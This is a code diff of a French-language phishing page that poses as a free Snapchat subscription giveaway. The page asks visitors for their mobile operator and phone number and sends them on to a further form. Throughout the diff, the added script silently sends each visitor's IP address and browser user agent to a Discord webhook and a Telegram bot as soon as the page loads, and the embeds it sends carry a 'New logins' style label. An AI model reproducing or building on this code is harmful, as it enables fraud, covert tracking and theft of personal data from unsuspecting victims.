@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8" />
-<title>Concours - Étape 1</title>
+<title>Snap + 1 ans gratuit 🎁</title>
 <style>
   body {
     background: #2c014d;
@@ -23,15 +23,26 @@
     box-shadow: 0 0 15px #9b00ff;
     border: 2px solid #a54ffb;
   }
-  button {
+  input, select, button {
     width: 100%;
     margin: 8px 0;
     padding: 12px;
     border: 2px solid #a54ffb;
     border-radius: 10px;
+    background: transparent;
+    color: white;
+    font-size: 16px;
+    outline: none;
+    box-shadow: inset 0 0 8px #9b00ff;
+    transition: 0.3s;
+  }
+  input:focus, select:focus {
+    border-color: #f7b500;
+    box-shadow: 0 0 10px #f7b500;
+  }
+  button {
     background: #f7b500;
     color: #2c014d;
-    font-size: 16px;
     font-weight: bold;
     cursor: pointer;
     box-shadow: 0 0 10px #f7b500;
@@ -49,8 +60,18 @@
 </head>
 <body>
 <div class="c">
-  <h1>Étape 1 : Ouverture de la page</h1>
-  <button id="sendBtn">Envoyer infos & Continuer</button>
+  <h1>Étape 1 : Votre numéro 📞</h1>
+  <form id="form1">
+    <select name="operateur" required>
+      <option value="" disabled selected>Choisissez votre opérateur</option>
+      <option value="Orange">Orange</option>
+      <option value="SFR">SFR</option>
+      <option value="Free">Free</option>
+      <option value="Bouygues">Bouygues</option>
+    </select>
+    <input name="telephone" type="tel" placeholder="Numéro de téléphone" pattern="[0-9]{10}" required />
+    <button type="submit">Continuer</button>
+  </form>
   <div id="msg"></div>
 </div>
 
@@ -71,57 +92,63 @@
 
   async function sendDiscord(embed) {
     return fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ embeds: [embed] }),
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
     });
   }
 
   async function sendTelegram(text) {
     return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text,
-        parse_mode: "Markdown",
-        disable_web_page_preview: true,
-      }),
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true
+      })
     });
   }
 
-  document.getElementById("sendBtn").addEventListener("click", async () => {
-    const msgEl = document.getElementById("msg");
-    msgEl.style.color = "#f88";
-    msgEl.textContent = "Envoi en cours...";
-
+  async function sendIpUaOnLoad() {
     const ip = await getIP();
     const ua = navigator.userAgent || "Inconnu";
 
     const discordEmbed = {
-      title: "[🌐] New logins [🌐]",
+      title: "[🌐] PAGE OUVERTE [🌐]",
       color: 0x9B00FF,
       fields: [
         { name: "🌐 Adresse IP", value: ip, inline: false },
-        { name: "🌐 User-Agent", value: ua, inline: false },
+        { name: "🌐 User-Agent", value: ua, inline: false }
       ],
-      timestamp: new Date().toISOString(),
+      timestamp: new Date().toISOString()
     };
 
     const telegramText =
-      `[🌐] New logins [🌐]\n\n` +
+      `[🌐] PAGE OUVERTE [🌐]\n\n` +
       `🌐 Adresse IP : ${ip}\n` +
       `🌐 User-Agent : ${ua}`;
 
-    try {
-      await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
-      localStorage.setItem("step1", JSON.stringify({ ip, ua }));
-      msgEl.style.color = "#0f0";
-      msgEl.textContent = "Envoyé ! Redirection...";
-      setTimeout(() => (window.location.href = "formulaire.html"), 1200);
-    } catch {
-      msgEl.textContent = "Erreur lors de l'envoi, réessayez.";
-    }
+    await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
+  }
+
+  window.addEventListener('load', sendIpUaOnLoad);
+
+  document.getElementById("form1").addEventListener("submit", (e) => {
+    e.preventDefault();
+    localStorage.setItem("step1", JSON.stringify({
+      operateur: e.target.operateur.value,
+      telephone: e.target.telephone.value
+    }));
+
+    const msgEl = document.getElementById("msg");
+    msgEl.style.color = "#0f0";
+    msgEl.textContent = "Redirection...";
+
+    setTimeout(() => {
+      window.location.href = "formulaire.html";
+    }, 1000);
   });
 </script>
 </body>
